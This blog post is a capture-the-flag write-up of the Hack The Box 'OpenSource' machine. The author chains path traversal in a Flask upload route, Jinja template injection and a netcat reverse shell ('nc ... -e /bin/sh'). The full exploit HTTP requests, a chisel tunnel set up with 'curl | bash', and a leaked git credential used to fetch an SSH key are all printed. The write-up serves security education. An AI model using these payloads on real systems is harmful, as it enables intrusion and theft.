+++
title = "First HTB ⛳️: OpenSource"
date = 2022-05-30

[taxonomies]
categories = ["htb"]
+++

This weekend I hacked my way through my first Hack The Box CTF. This was an exciting/frustrating and enlightening experience. 

This writeup cronicles how I hacked the box, and some of the interestings things I learned on the way.

<!-- more -->

# The Journey

The [OpenSource machine](https://app.hackthebox.com/machines) was my first HTB CTF, and I had a great time hacking away and capturing the flags.

This machine is named open source because, the exploit revolves around an open source webapp that has some serious but subtle bugs.

I was especially excited to get started on this challenge since it is focusd on software development, and I'm coming to the pen testing world as a software engineer.

## Discovery

**Scan ports**

First we run a port scan on the box to see what services are running. 

```bash
➜ sudo nmap -sS -A 10.10.11.164
```
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-24 22:37 EDT
Nmap scan report for 10.10.11.164
Host is up (0.0097s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
...
```


We know that port 22 is `ssh`, 3000 is some service that looks like it's running but has some IP rules protecting it. Lastly we have port 80 running the custom web app.

We'll be taking at look at ports `80` first and `3000` later since it's filtered.


Note:
1. we have 2 open ports, ssh and http
2. 1 filtered (probably IP rules on the box)


**Explore source code structure**

We can navigate to the IP in our browser to see what the site looks like.

At the bottom of the page we are given a link to the source. Which we can see the file structure of below.

```bash
➜ tree . -L 3
.
├── .git
│     ├── ...
│     └── refs
├── Dockerfile
├── app
│     ├── INSTALL.md
│     ├── app
│     │     ├── __init__.py
│     │     ├── __pycache__
│     │     ├── configuration.py
│     │     ├── static
│     │     ├── templates
│     │     ├── utils.py
│     │     └── views.py
│     ├── public
│     │     └── uploads
│     ├── requests
│     │     ├── code-execution
│     │     └── update-index
│     └── run.py
├── build-docker.sh
└── config
    └── supervisord.conf

9 directories, 11 files
```

Note:
1. It's a git repo
2. It's using a `docker` container
3. It's using `supervisord`

**Explore source code contents**


*snippet from views.py*

```python
@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Inside of the `app/views.py` file we can see that the code makes relative path calls using user input.

This looks like a good way for us to access more data ont the box. Or possibly a way to place a file in a favorable location.


**Examine validation logic**

Inside of `app/utils.py` can see that there's some custom written validation logic that removes any `../` (dot dot slash).

```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```


Note:
1. written recursively which makes it hard to trick
2. can't use `../` 
3. maybe `//` (directly navigate to root)?


**Testing entrypoint**

We can craft a request to send that should upload a file to an unexpected directory


First lets craft a new file called `prove.http`. 

```http
GET /uploads/..%2F/app/run.py HTTP/1.1
Connection: close


```

This file contains a simple GET request that attampts to exploit the uploads file to include a file we know exists (from the open source) in a directory above the expected one.


Send it with netcat

```bash
nc 10.10.11.164 80 < prove.http
```

Response
```http
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Tue, 31 May 2022 04:45:51 GMT
Content-Disposition: inline; filename=run.py
Content-Type: text/x-python; charset=utf-8
Content-Length: 141
Last-Modified: Wed, 23 Mar 2022 00:33:44 GMT
Cache-Control: no-cache
ETag: "1647995624.0-141-388170764"
Date: Tue, 31 May 2022 04:45:51 GMT
Connection: close

import os

from app import app

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 80))
    app.run(host='0.0.0.0', port=port)
```

🙌 woo thats a great response. We can see that the server runs the contents of a python file.


Next lets use this exploit to escalate our access. Our goal is to open a reverse shell on the box.

## Foothold

Now that we have a viable attack vector we want to use it to give us remote code execution.

From our discovery we know that we can write files, but it's unclear which file we should upload.

**Exploit relative path**

If we look into the source code further we can see that there are `template` files. These seem to be HTML with a templating languge. 


For example this is a snippet from the `templates/success.html` file that shows the double curly bracket notation. 

The double curly brackets is from the `jinja` template libray, and should allow us to limited execution.

We can do some execution like `{{ 2+2 }}` which would resolve as `{{ 4 }}`

```html
<p>Your <a style="text-decoration: none;" href="{{ file_url }}">file</a> has been uploaded.</p>
```

Instead of writing new files, we can overwrite the template files and exploit the jinja injection notation to execute remote code.

With a quick google, thanks to Podalirius' [article](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) we can also see that it's shouldnt be hard to esclate to arbitrary code execution if we can access the shell.

Essentally we want to write something like this

```python
self
  .__init__
  .__globals__
  .__builtins__
  .__import__('os')
  .system('id')
```

but with a reverse shell payload, so we want:

```python
self
  .__init__
  .__globals__
  .__builtins__
  .__import__('os')
  .system('nc 10.10.14.7 4444 -e /bin/sh')
```

**Reverse shell**

We can craft a HTTP request using this payload and lets just completely replace the root page on the server.

Of course this will make our attack obvious to anyone using the site, so in a real world situation we'd hide this payload inside of the main page instead.

```http
POST /upcloud HTTP/1.1
Host: 10.10.11.164
Content-Length: 5853
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.164
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHIrKoubQdZqALfJ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.11.164/upcloud
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundarySHIrKoubQdZqALfJ
Content-Disposition: form-data; name="file"; filename="//app/app/templates/index.html"
Content-Type: application/octet-stream

{{
self.__init__.__globals__.__builtins__.__import__('os').system('nc 10.10.14.7 4444 -e /bin/sh')
}}
------WebKitFormBoundarySHIrKoubQdZqALfJ--


```

Now on our attacking machine we want to prepare ourselves to recieve the reverse shell that we just planted.

```bash
# nc or ncat if your on osx
ncat -lvp 4444
```


Send the exploit 

```bash
nc 10.10.11.164 80 < exploit.http
```

Finally we can open the webpage in our browser to trigger the code and connect back to our listener. 

💥 we have a shell!

**Upgrade shell**

The shell we have is pretty crappy and we'll want to upgrade it before we explore this box. 

First lets open a better shell binary `ash`

```sh
python -c 'import pty; pty.spawn("/bin/ash")'
```

Next we'll need to reset the `tty` which we can do by moving the current shell to the background reseting `stty` and rejoining the shell.

```bash
# hit CTRL-Z
stty raw -echo; fg
```

type `reset` and press `[enter]` and we should be met with a much more user friendly shell.

**Explore box**

Now that we have a working shell we can jump all around the box checking out files and access.

Both the user and root dir's are empty and don't contain flags! We must be in the wrong place... After some more investigating and remembering there's a `Dockerfile`, we realize we're in a container.

Note:
1. We have `root`
2. We're in a container

At this point we need some way to esclate but it looks unlikely that a Docker exploit will be the way in.

Lets see if we can communicate with the filtered port we saw earlier. 

We can. Lets explore that further.

## Pivot

Knowing that we can talk to the port. Lets see what services are running.


**Prepare tunnel**

Let's use chisel to tunnel our traffic from out attack box, through the target box.

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz
ncat -lvp 8888 < chisel_1.7.7_linux_386.gz
nc 10.10.14.46 8888 > chisel.gz
```

On the target box lets unzip this binary and make it executable.
```bash
gzip -d chisel.gz
chmod +x chisel
```

Now on the attack box, lets listen for the connection

```bash
curl https://i.jpillora.com/chisel! | bash
chisel server -p 7000 --reverse -v
```

**Tunnel**

Connect 
```bash
chisel client 10.10.14.46:7000 R:3000:10.10.11.164:3000
```

Now we should be able to access port `localhost:3000` in our browser.

Woop! That works and see can see Gitea running.


**Explore hidden service**

Now that we have access to this git instance we'll want to figure out how to get a shell on the box (not container).

Snooping around the site we can see there's an existing user named `dev01` and there's not much else going on.

At this point maybe we should revisit the `.git` folder and see if there are any artifacts that can help us.

**Enumerate git commits**

We can take a look at old commits via the git cli. 

```bash
git --no-pager log --decorate=short -3 --stat
```
```
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

 Dockerfile | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

 .gitignore                | 26 ++++++++++++++++++++++++++
 app/.vscode/settings.json |  5 -----
 2 files changed, 26 insertions(+), 5 deletions(-)

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

 app/.vscode/settings.json |  5 +++++
 app/app/views.py          | 14 ++++++++++++--
 2 files changed, 17 insertions(+), 2 deletions(-)
```


Its interesting that the `app/.vscode/settings.json` has been added and deleted on the next commit.

Lets look at the changes

```bash
git \
    --no-pager diff \
    a76f8f75f7a4a12b706b0cf9c983796fa1985820 \
    -- app/.vscode/settings.json
```

```
@@ -1,5 +0,0 @@
-{
-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
-  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
-  "http.proxyStrictSSL": false
-}
```

🙌 amazing! We can see that the dev accidently commited the `user:pass`


**Explore git account**

From this point we can use the UI to access the account by entering the creds we just found.

After logging in, we can see that `dev01` has a private repo called `home-backup`. 

Inside of `home-backup` we have a `.ssh/` folder which luckily (a super bad move by dev01) contains a private ssh key.

**Clone ssh key**

We can grab the key from the browser or download it as a file directly.

```bash
curl \
    --user "dev01:Soulless_Developer#2022" \
    http://localhost:3000/dev01/home-backup/raw/branch/main/.ssh/id_rsa > sshkey.pem
```

Finally, we'll try the key on the box

```bash
# chmod 400 sshkey.pem
ssh -i sshkey.pem dev01@10.10.11.164
```

💥 and were in!

**Show user flag**

Last step for the first flag is to `cat` the contents of the file.

```bash
cat user.txt
```

🍾 WOOOOOOO, we did it. Our first CTF flag (at least the user flag)

Next steps is to escalate our access to `root` but we'll leave that for another day.

# Summary

Description: 

We used a **relative path bug** to leverage **local file inclusion** to **open a reverse shell** into the docker container. Then we **pivoted** from the container by **tunneling traffic** from the **hidden service (git)** to our local machine. Next we were able to esclate our access by **enumerating old git commits** to find hidden a hidden credential. Finally we were able to us the creds to access a **ssh key** which allowed us to access the box as a user.

Steps:
- Scan ports
- Explore source code structure
- Explore source code contents
- Examine validation logic
- Testing entrypoint
- Exploit relative path
- Reverse shell
- Upgrade shell
- Explore box
- Prepare tunnel
- Tunnel
- Explore hidden service
- Enumerate git commits
- Explore git account
- Clone ssh key
- Show user flag